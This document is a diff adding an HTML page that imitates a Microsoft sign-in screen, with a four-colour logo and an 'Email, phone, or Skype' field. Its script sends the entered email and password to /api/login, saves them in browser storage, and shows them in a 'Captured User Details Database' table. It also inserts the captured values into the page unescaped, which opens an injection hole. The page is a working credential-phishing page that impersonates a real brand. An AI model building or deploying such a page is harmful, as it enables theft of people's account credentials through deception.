@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.03)), url('https://placeholder.com');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .login-box {
+            background: #ffffff;
+            width: 440px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            border: 1px solid #d2d2d2;
+            overflow: hidden;
+        }
+
+        .top-banner {
+            width: 100%;
+            height: 120px; 
+            background-color: #eaeaea; 
+            background-image: url('https://placeholder.com'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            border-bottom: 1px solid #d2d2d2;
+        }
+
+        .login-content {
+            padding: 36px 44px 44px 44px;
+        }
+
+        .ms-logo {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2px;
+            width: 34px;
+            height: 34px;
+            margin-bottom: 24px;
+        }
+
+        .square { width: 16px; height: 16px; }
+        .red { background-color: #f25022; }
+        .green { background-color: #7fba00; }
+        .blue { background-color: #00a4ef; }
+        .yellow { background-color: #ffb900; }
+
+        h2 {
+            color: #1b1b1b;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            margin-bottom: 20px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 6px 10px 6px 0px;
+            border: none;
+            border-bottom: 1px solid #605e5c;
+            font-size: 15px;
+            outline: none;
+            background: transparent;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-bottom: 2px solid #0067b8;
+            padding-bottom: 5px;
+        }
+
+        .links-container { margin-bottom: 28px; }
+        .links-container p { font-size: 13px; color: #1b1b1b; margin-bottom: 8px; }
+        .links-container a { color: #0067b8; text-decoration: none; }
+        .links-container a:hover { text-decoration: underline; }
+        .action-buttons { display: flex; justify-content: flex-end; }
+
+        .btn-submit {
+            background-color: #0067b8;
+            color: #ffffff;
+            border: none;
+            padding: 6px 20px;
+            min-width: 108px;
+            font-size: 15px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .btn-submit:hover { background-color: #005da6; }
+
+        .dashboard-container {
+            display: none;
+            background: #ffffff;
+            width: 80%;
+            max-width: 800px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            border-radius: 4px;
+            border: 1px solid #d2d2d2;
+        }
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid #0078d4;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        .user-welcome {
+            font-size: 20px;
+            color: #333333;
+        }
+
+        .btn-logout {
+            background-color: #e81123;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .log-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .log-table th, .log-table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .log-table th {
+            background-color: #f3f2f1;
+            color: #323130;
+            font-weight: 600;
+        }
+
+        .log-table tr:nth-child(even) { background-color: #faf9f8; }
+        
+        .empty-message {
+            text-align: center;
+            color: #605e5c;
+            padding: 20px;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box" id="loginScreen">
+        <div class="top-banner"></div>
+        <div class="login-content">
+            <div class="ms-logo">
+                <div class="square red"></div>
+                <div class="square green"></div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+
+            <h2>Sign in</h2>
+            
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+                </div>
+
+                <div class="input-field">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                
+                <div class="links-container">
+                    <p>No account? <a href="#">Create one!</a></p>
+                    <p><a href="#">Can't access your account?</a></p>
+                </div>
+                
+                <div class="action-buttons">
+                    <button type="submit" class="btn-submit">Sign in</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="dashboard-container" id="dashboardScreen">
+        <div class="dashboard-header">
+            <div class="user-welcome">Microsoft 365 — <strong>Admin Central Log Dashboard</strong></div>
+            <button class="btn-logout" id="logoutBtn">Sign Out</button>
+        </div>
+
+        <h3>Captured User Details Database</h3>
+        <p style="font-size: 13px; color: #666; margin-bottom: 15px;">All details entered on the login screen are safely logged below into browser local storage.</p>
+
+        <table class="log-table">
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>Email Address</th>
+                    <th>Captured Password String</th>
+                </tr>
+            </thead>
+            <tbody id="logTableBody">
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const loginScreen = document.getElementById('loginScreen');
+        const dashboardScreen = document.getElementById('dashboardScreen');
+        const logTableBody = document.getElementById('logTableBody');
+        const logoutBtn = document.getElementById('logoutBtn');
+
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const emailValue = document.getElementById('email').value;
+            const passwordValue = document.getElementById('password').value;
+            const timestamp = new Date().toLocaleString();
+
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: emailValue, password: passwordValue })
+                });
+            } catch (err) {
+                console.error('Error sending log:', err);
+            }
+
+            let savedUsers = JSON.parse(localStorage.getItem('capturedUsers')) || [];
+            savedUsers.push({
+                time: timestamp,
+                email: emailValue,
+                password: passwordValue
+            });
+
+            localStorage.setItem('capturedUsers', JSON.stringify(savedUsers));
+            renderTable();
+
+            loginScreen.style.display = 'none';
+            dashboardScreen.style.display = 'block';
+        });
+
+        function renderTable() {
+            logTableBody.innerHTML = '';
+            let savedUsers = JSON.parse(localStorage.getItem('capturedUsers')) || [];
+
+            if(savedUsers.length === 0) {
+                logTableBody.innerHTML = `<tr><td colspan="3" class="empty-message">No user details have been captured yet.</td></tr>`;
+                return;
+            }
+
+            savedUsers.reverse().forEach(function(user) {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${user.time}</td>
+                    <td><strong>${user.email}</strong></td>
+                    <td>${user.password}</td>
+                `;
+                logTableBody.appendChild(row);
+            });
+        }
+        
+        renderTable();
+
+        logoutBtn.addEventListener('click', function() {
+            dashboardScreen.style.display = 'none';
+            loginScreen.style.display = 'block';
+            loginForm.reset();
+        });
+    </script>
+</body>
+</html>
